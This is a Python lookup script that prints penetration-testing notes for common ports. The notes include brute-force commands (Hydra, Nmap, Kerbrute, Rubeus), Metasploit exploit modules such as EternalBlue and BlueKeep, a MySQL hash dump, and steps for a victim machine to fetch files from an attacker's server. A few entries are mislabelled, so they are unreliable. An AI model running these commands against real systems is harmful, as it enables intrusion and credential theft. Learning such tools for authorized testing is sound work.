ports = {'21': "ftp \n\nbasic usage: \nftp 10.10.10.10 \n\nftp basic commands: \n\n?    to request help or information about the FTP commands \nascii   to set the mode of file transfer to ASCII \n(this is the default and transmits seven bits per character \nbinary    to set the mode of file transfer to binary' \n(the binary mode transmits all eight bits per byte and thus provides less chance of a transmission error and must be used to transmit files other than ASCII files) \nbye    to exit the FTP environment (same as quit) \ncd    to change directory on the remote machine \nclose    to terminate a connection with another computer n\close brubeck    closes the current FTP connection with brubeck, but still leaves you within the FTP environment. n\delete 	to delete (remove) a file in the current remote directory (same as rm in UNIX) \nget    to copy one file from the remote machine to the local machine \nget ABC DEF    copies file ABC in the current remote directory to (or on top of) a file named DEF in your current local directory \nget ABC    copies file ABC in the current remote directory to (or on top of) a file with the same name, ABC, in your current local directory \nhelp    to request a list of all available FTP commands \nlcd    to change directory on your local machine (same as UNIX cd) \n ls    to list the names of the files in the current remote directory \nmkdir    to make a new directory within the current remote directory \nmget    to copy multiple files from the remote machine to the local machine;    \nyou are prompted for a y/n answer before transferring each file    \nmget * 	copies all the files in the current remote directory to your current local directory, using the same filenames \n        Notice the use of the wild card character, *.\nmput    to copy multiple files from the local machine to the remote machine;\n        you are prompted for a y/n answer before transferring each file \nopen    to open a connection with another computer \nopen brubeck 	opens a new FTP connection with brubeck; \n        you must enter a username and password for a brubeck account \n        (unless it is to be an anonymous connection) \nput    to copy one file from the local machine to the remote machine \npwd    to find out the pathname of the current directory on the remote machine \nquit    to exit the FTP environment (same as bye) \nrmdir    to remove (delete) a directory in the current remote directory \n\nbasic usage with pyftpdlib \n\nAllows to set up a local server to upload files to a victim machine using ftp, such as SimpleHttpServer \n\nusage: python -m pyftpdlib 21 \n\nfrom victim machine: ftp <attacker's ip> \n\nftp anon nsedocs - NMAP - Checks if an FTP server allows anonymous logins \n\nusage: nmap -sV -sC <target> \n\nftp brute nsedocs - Performs brute force password auditing against FTP servers \n\nusage: nmap --script ftp-brute -p 21 <host> \n\nftp version msf \n\nusage: use auxiliary/scanner/ftp/ftp_version \n\nftp brute forcing with Hydra \n\nusage: hydra -t 1 -l admin -P /root/Desktop/password.lst -v 192.168.1.1 ftp \n\n" , '22': "ssh \n\nbasic usage: \n\nusage: ssh <host> \n\nbasic commands \n\nls    Show directory contents (list the names of files) \ncd    Change Directory \nmkdir    Create a new folder (directory) \ntouch    Create a new file \nrm    Remove a file \ncat    Show contents of a file \npwd    Show current directory (full path to where you are right now) \ncp    Copy file/folder \nmv    Move file/folder \ngrep    Search for a specific phrase in file/lines \nfind    Search files and directories \nvi/nano    Text editors \nhistory    Show last 50 used commands \nclear    Clear the terminal screen \ntar    Create & Unpack compressed archives \nwget    Download files from the internet \mdu    Get file size \n\nbasic usage with id_rsa \n\nusage: ssh -i <id_rsa> user@10.10.10.10 \n\nssh brute nsedocs - Performs brute-force password guessing against ssh servers \n\nusage: nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst \--script-args ssh-brute.timeout=4s <target> \n\nssh version msf \n\nusage on metasploit: auxiliary/scanner/ssh/ssh_version \n\nssh login msf \n\nuse auxiliary/scanner/ssh/ssh_login \n\nssh hydra \n\nusage: hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh", '23': "telnet \n\nbasic usage: \n\ntelnet + <host> / <host> + port \n\ntelnet basic commands: \n\n? 	        Calls up the help menu \nclose 	        Ends the Telnet session \ndisplay         argument Displays the various parameters for the current connection (port, terminal type, etc.) \nenviron         argument defines variables for the respective operating system environment \nlogout 	        Ends the current Telnet session as long as the remote host supports the logout option \nmode type 	Specifies the transmission type (text file, binary file) \nopen hostname 	Builds an additional connection to the selected host on top of the existing connection \nquit 	        Ends the Telnet client connection including all active connections \nsend argument 	Sends selected, typical Telnet character strings to the host \nset argument 	Changes the connection parameters \nunset 	        Loads the pre-defined connection parameters \n\ntelnet brute nsedocs - NMAP - Performs brute-force password auditing against telnet servers \n\nnmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s <target> \n\ntelnet version msf \n\nuse auxiliary/scanner/telnet/telnet_version \n\ntelnet login msf \n\nusage: use auxiliary/scanner/telnet/telnet_login", '53': "dns \n\nwhat does it do? \n\nDescription: DNS is the glue that translates human-readable domain and machine names like grc.com or amazon.com \ninto their machine-readable Internet Protocol (IP) address equivalents. DNS servers listen on port 53 for queries from DNS clients \n\ndns-nsec-enum nsedocs - NMAP - Enumerates DNS names using the DNSSEC NSEC-walking technique \n\nusage: nmap -sSU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=example.com <target> \n\ndns brute nsedocs - NMAP - Attempts to enumerate DNS hostnames by brute force guessing of common subdomains \n\nusage: nmap --script dns-brute --script-args dns-brute.domain=foo.com,dns-brute.threads=6,dns-brute.hostlist=./hostfile.txt,newtargets -sS -p 80 \n nmap --script dns-brute www.foo.com \n\ndns Subdomains BF \n\nusage:    dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <IP_DNS> \n          dnscan -d <domain> -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way" , '80': "http \n\nwhat does it do? \n\nPort 80 is the port number assigned to commonly used internet communication protocol, Hypertext Transfer Protocol (HTTP) \nIt is the port from which a computer sends and receives Web client-based communication \nand messages from a Web server and is used to send and receive HTML pages or data \n\nrobots.txt - A robots.txt file tells search engine crawlers which pages or files the crawler can or can't request from your site \n\nusage: just place robots.txt after the site address eg: www.nevergonna.com/robots.txt \n\nhttp header msf \n\nusage: use auxiliary/scanner/http/cert \n\nnikto - Nikto is a free software command-line vulnerability scanner that scans webserver \n\nusage: nikto -h <site> \n\nhttp version msf \n\nusage: use auxiliary/scanner/http/http_version \n\ndir listing msf  \n\nuse auxiliary/scanner/http/dir_listing \n\ndirb \n\ndirb http:/https:www.giveyou.com \n\ndirbuster \n\nusage: on cli run dirbuster  \n\nonce the app open, set the target site, threads and choose the dictionary path, usr/share/wordlists or any other \n\ngobuster \n\nusage: gobuster dir -u http://192.168.1.105/ -w /usr/share/wordlists/dirb/common.txt \n\ndirhunt \n\ndirhunt + site \n\nburp \n\nusage:    portswigger.net/web-security \n\ntest ssl \n\nusage: https://github.com/drwetter/testssl.sh \n\nsimple http server \n\nallows you to set up a server to upload files from an attacker machine \n\nusage: python - m SimpleHTTPServer + port or default \n\nfrom victim side allows you to use some methods such as wget, curl, certutil to download files" , '88': "kerberos \n\nwhat does it do? \n\nTCP port 88 uses the Transmission Control Protocol. TCP is one of the main protocols in TCP/IP networks \n\nMS14-068 - Microsoft Kerberos Checksum Validation Vulnerability \n\nusage: msf > use auxiliary/admin/kerberos/ms14_068_kerberos_checksum \n\nkrb5-enum-users-nse - NMAP - Discovers valid usernames by brute force querying likely usernames against a Kerberos service \n\nnmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' \n\nkerbrute for linux \n\n./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt \n\nkerbrute for windows \n\n.\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:jurassic.park /outfile:jurassic_passwords.txt \n\nimpacket - Impacket is a collection of Python classes for working with network protocols \nImpacket is focused on providing low-level programmatic access to the packets and for some protocols \nusage: github.com/SecureAuthCorp/impacket",
          '139': "smb \n\nsmb basic usage: \n\nusage: smbclient -L \\\\<host>\\ \n\nsmb basic commands: \n\nls             dir            lcd            cd             pwd  \nget            mget           put            mput           rename  \nmore           mask           del            rm             mkdir\nmd             rmdir          rd             prompt         recurse \ntranslate      lowercase      print          printmode      queue \ncancel         stat           quit           q              exit \nnewer          archive        tar            blocksize      tarmode \nsetmode        help           ?              ! \n\nhydra smb \n\nusage: hydra -L usernames.txt -P passwords.txt 192.168.2.66 ssh -V \n\ncheck if port 445 is open \n\nusage: nmap -p 445 -g 139 IP \n\nsmb version msf \n\nusage: msf > use auxiliary/scanner/smb/smb_version \n\nsmb-enum-shares - NMAP - Attempts to list shares using the srvsvc.NetShareEnumAll MSRPC function and retrieve more information about them using srvsvc \n\nnmap --script smb-enum-shares.nse -p445 <host> \n\n       sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <host> \n\nbrute smb - NMAP - smb brute force \n\nusage: nmap --script smb-brute.nse -p445 <host> \n\n       sudo nmap -sU -sS --script smb-brute.nse -p U:137,T:139 <host> \n\nls smb - NMAP - Attempts to retrieve useful information about files shared on SMB volumes. The output is intended to resemble the output of the UNIX ls command \n\nusage:    nmap -p 445 <ip> --script smb-enum-shares,smb-ls"
          ,'443': "https/ssl \n\nwhat does it do? \n\nTCP port 443 is the standard TCP port that is used for website which use SSL \n\nUSE THE SAME PROGRAMS AS PORT 80!!\n\ntest ssl \n\nusage:    github.com/drwetter/testssl.sh \n\nIIS - shortname - scanner / The latest version of scanner for IIS short file name (8.3) disclosure vulnerability by using the tilde (~) character \n\nusage:targetsite/folder/valid*~1.*\.asp \n      targetsite/folder/invalid*~1.*\.asp \n\nMethod of sending the request such as GET, POST, OPTIONS, DEBUG, ... is also important" , '445': "smb \n\nbasic usage \n\nusage: smbclient -L \\\\<host>\\ \n\nbasic commands: \n\nls             dir            lcd            cd             pwd \nget            mget           put            mput           rename\nmore           mask           del            rm             mkdir \nmd             rmdir          rd             prompt         recurse \ntranslate      lowercase      print          printmode      queue \ncancel         stat           quit           q              exit \nnewer          archive        tar            blocksize      tarmode  \nsetmode        help           ?              ! \n\nsmb version msf \n\nusage: msf > use auxiliary/scanner/smb/smb_version \n\nsmb-enum-shares - NMAP - Attempts to list shares using the srvsvc.NetShareEnumAll MSRPC function and retrieve more information about them using srvsvc \n\nusage: nmap --script smb-enum-shares.nse -p445 <host> \n\nbrute smb - NMAP - smb brute force \n\nusage: nmap --script smb-brute.nse -p445 <host> \n       sudo nmap -sU -sS --script smb-brute.nse -p U:137,T:139 <host> \n\nsmb eternalblue msf module (happiness!!) \n\nusage: msf > use exploit/windows/smb/ms17_010_eternalblue \n\n*check all the eternalblue module on mfs \n\nhydra smb \n\nusage: hydra -L usernames.txt -P passwords.txt 192.168.2.66 ssh -V \n\nsmb psexec msf \n\nusage: use exploit/windows/smb/psexec \n\nimpacket - Impacket is a collection of Python classes for working with network protocols \n\nImpacket is focused on providing low-level programmatic access to the packets and for some protocols \n\nusage: github.com/SecureAuthCorp/impacket", '636': "ldap \n\nwhat does it do? \n\nLDAP, the Lightweight Directory Access Protocol, is a mature, flexible, and well supported standards-based mechanism for interacting with directory servers \n\nldap brute - NMAP - Attempts to brute-force LDAP authentication. By default it uses the built-in username and password lists \n\n      In order to use your own lists use the userdb and passdb script arguments \n\nusage: nmap -p 389 --script ldap-brute --script-args ldap.base=cn=users,dc=cqure,dc=net <host>" , '3306': "mysql \n\nwhat does it do? \n\nPort 3306 is the default port for the MySQL Protocol ( port ), which is used by the mysql client, MySQL Connectors, and utilities such as mysqldump and mysqlpump \n\nmysql-databases - NMAP - Attempts to list all databases on a MySQL server \n\nusage: nmap -sV --script=mysql-databases <target> \n\nmysql-brute - NMAP -  Performs password guessing against MySQL \n\nusage: nmap --script=mysql-brute <target> \n\nmysql_login msf \n\nusage: use auxiliary/scanner/mysql/mysql_login \n\nmysql_version msf \n\nusage: use auxiliary/scanner/mysql/mysql_version \n\nMySQL Authentication Bypass Password Dump msf -  This module exploits a password bypass vulnerability in MySQL in order to extract the usernames and encrypted password hashes from a MySQL server \n\nThese hashes are stored as loot for later cracking \n\nusage: msf > use auxiliary/scanner/mysql/mysql_authbypass_hashdump" , '3389': "rdp \n\nwhat does it do? \n\nPort is IANA registered for Microsoft WBT Server \nused for Windows Remote Desktop and Remote Assistance connections (RDP - Remote Desktop Protocol). Also used by Windows Terminal Server \n\nBluekeep Attack msf ( Beware!! Danners said it can be very destructive, use under own RISK!!) \n\nusage: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce \n\nrdp brute force hydra \n\nusage: hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://192.168.1.1", '8080': "webserver \n\nwhat does it do? \n\nHTTP Alternate (see port 80 and port 81) Description: This port is a popular alternative to port 80 for offering web services \n\nwebdav iis 6.0 vulnerability msf \n\nusage: use auxiliary/scanner/http/dir_webdav_unicode_bypass \n\nweb proxy attack - NMAP - Checks if an HTTP proxy is open \n\nusage:nmap --script http-open-proxy.nse \--script-args proxy.url=<url>,proxy.pattern=<pattern>", '1337': "vuln \n\n1337 attack \n\nusage:     youtube.com/watch?v=dQw4w9WgXcQ"}
port = str(input("input port number "))
try:
    print(ports[port])
except:
    print("not available")

